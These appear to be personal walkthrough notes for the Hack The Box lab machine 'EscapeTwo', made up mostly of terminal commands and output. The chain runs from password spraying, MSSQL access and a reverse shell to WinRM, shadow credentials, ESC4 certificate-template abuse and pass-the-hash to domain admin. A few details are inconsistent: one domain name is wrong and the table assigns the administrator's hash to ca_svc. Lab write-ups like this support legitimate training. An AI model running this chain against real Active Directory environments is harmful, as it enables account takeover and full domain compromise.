LDAP        10.129.232.128  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Administrator:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Guest:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\krbtgt:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\michael:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\oscar:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\rose:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\s:MSSQLP@ssw0rd! 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Administrator:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Guest:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\krbtgt:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\michael:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\oscar:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\rose:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\s:Md9Wlq1E5bZnVDVo 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Administrator:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Guest:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\krbtgt:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\michael:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\sql_svc:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\rose:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\s:86LxLBMgEWaKUnBG 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Administrator:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Guest:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\krbtgt:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\michael:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\s:0fwz7Q4mSpurIt99 
                                                                                           
```


```bash {15}
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc mssql 10.129.232.128 -u users.txt s -p pass.txt  --local-auth 
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
MSSQL       10.129.232.128  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.232.128  1433   DC01             [-] DC01\Administrator:MSSQLP@ssw0rd! (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\Guest:MSSQLP@ssw0rd! (Login failed for user 'Guest'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\krbtgt:MSSQLP@ssw0rd! (Login failed for user 'krbtgt'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\michael:MSSQLP@ssw0rd! (Login failed for user 'michael'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\ryan:MSSQLP@ssw0rd! (Login failed for user 'ryan'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\oscar:MSSQLP@ssw0rd! (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\sql_svc:MSSQLP@ssw0rd! (Login failed for user 'sql_svc'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\rose:MSSQLP@ssw0rd! (Login failed for user 'rose'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [-] DC01\ca_svc:MSSQLP@ssw0rd! (Login failed for user 'ca_svc'. Please try again with or without '--local-auth')
MSSQL       10.129.232.128  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)

```

```
──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ impacket-mssqlclient 'sa:MSSQLP@ssw0rd!'@10.129.232.128              
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 

```

Usingmssql shell to get revshell
```bash {28-29}
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.232.128] 64000

PS C:\Windows\system32> whoami
sequel\sql_svc
PS C:\Windows\system32> 

PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
PS C:\SQL2019\ExpressAdv_ENU> 

```

Spray new password
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc ldap 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3' 
LDAP        10.129.232.128  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3 
LDAP        10.129.232.128  389    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 
LDAP        10.129.232.128  389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 

```

```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' 
WINRM       10.129.232.128  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.128  5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ evil-winrm -i 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'           
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> cd desktop
*Evil-WinRM* PS C:\Users\ryan\desktop> ls


    Directory: C:\Users\ryan\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/22/2026   9:48 AM             34 user.txt


*Evil-WinRM* PS C:\Users\ryan\desktop> cat user.txt
2c0c4c7b6192a7f782c5adef8179b634
*Evil-WinRM* PS C:\Users\ryan\desktop> 

```
### Lateral Movement
### Priv escalation

![[Assets/Pasted image 20260923004916.png]]

Change owner of user to ryan and run certipy
This  is change password
```

bloodyad -d administrator.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --host "10.129.232.128" set owner "ca_svc" "ryan"
bloodyad -d administrator.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --host "10.129.232.128" add genericAll "ca_svc" "ryan"

net rpc password "ca_svc" "Anh12345" -U "sequel.htb/ryan%WqSZAF6CysDQbGb3" -S 10.129.232.128


┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy find -enabled -vulnerable -hide-admins -u 'ca_svc@sequel.htb' -p 'Anh12345' -dc-ip 10.129.232.128
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260922151644_Certipy.txt'
[*] Wrote text output to '20260922151644_Certipy.txt'
[*] Saving JSON output to '20260922151644_Certipy.json'
[*] Wrote JSON output to '20260922151644_Certipy.json'
                                                        

```
This is using shadow cred to get hash
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ bloodyad -d administrator.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --host "10.129.232.128" set owner "ca_svc" "ryan"
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ bloodyad -d administrator.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --host "10.129.232.128" add genericAll "ca_svc" "ryan"
[+] ryan has now GenericAll on ca_svc
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.232.128                
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd93ad2a2911642dea0e0afe6eda80518'
[*] Adding Key Credential with device ID 'd93ad2a2911642dea0e0afe6eda80518' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'd93ad2a2911642dea0e0afe6eda80518' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
                                                             
```


To detect vulnerable template
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ cat 20260922151644_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-09-22T19:13:28+00:00
    Template Last Modified              : 2026-09-22T19:13:28+00:00
    Permissions
      Object Control Permissions
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Cert Publishers
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
   

```
After detect begin attack ECS4
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:192.168.122.1@53 answered The DNS operation timed out.; Server Do53:192.168.122.1@53 answered The DNS operation timed out.; Server Do53:192.168.122.1@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'

┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.129.232.128

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff


```

We get root shell

```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ evil-winrm -i 10.129.232.128 -u 'administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator

```


| Username | pass             | Hash                             |
| -------- | ---------------- | -------------------------------- |
| rose     | KxEPkKe6R8su     |                                  |
| oscar    | 86LxLBMgEWaKUnBG |                                  |
| sa       | MSSQLP@ssw0rd!   |                                  |
| sql_svc  | WqSZAF6CysDQbGb3 |                                  |
| ryan     | WqSZAF6CysDQbGb3 |                                  |
| ca_svc   |                  | 7a8d4e04986afa8ed4060f75e5a0b3ff |
|          |                  |                                  |

